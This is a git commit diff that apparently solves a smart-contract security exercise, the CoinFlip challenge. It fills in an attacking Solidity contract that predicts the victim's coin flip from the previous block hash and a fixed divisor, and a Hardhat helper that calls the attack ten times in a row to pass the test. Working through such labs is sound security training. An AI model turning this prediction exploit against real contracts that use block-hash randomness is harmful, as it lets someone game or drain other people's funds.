878efe801714973243dcb479746d83f88894a157
Ignacio Bravo <bravoignacio95@gmail.com>
2023-04-28 14:57:17 -0300

    CoinFlip Passing

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -2,6 +2,10 @@
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
+interface ICoinFlip{
+    function flip(bool _guess) external returns (bool);
+}
+
 contract AttackingCoinFlip {
     address public contractAddress;
 
@@ -9,7 +13,12 @@ contract AttackingCoinFlip {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
+    function hackContract() external returns (bool){
         // Code me!
+        uint256 FACTOR      = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 blockValue  = uint256(blockhash(block.number - 1));
+        uint256 coinFlip    = blockValue / FACTOR;
+        bool _guess         = coinFlip == 1 ? true : false;
+        return ICoinFlip(contractAddress).flip(_guess);
     }
 }
--- contracts/1. CoinFlip/CoinFlipHelper.ts
+++ contracts/1. CoinFlip/CoinFlipHelper.ts
@@ -3,6 +3,11 @@ import { ethers } from "hardhat";
 
 const helper = async (victim: any, attacker: any) => {
   // add code here that will help you pass the test
+  const CONSECUTIVEWINS = 10;
+  for (let i = 0; i < CONSECUTIVEWINS; i++){
+    let tx = await attacker.hackContract();
+    await tx.wait()
+  }
 };
 
 export default helper;
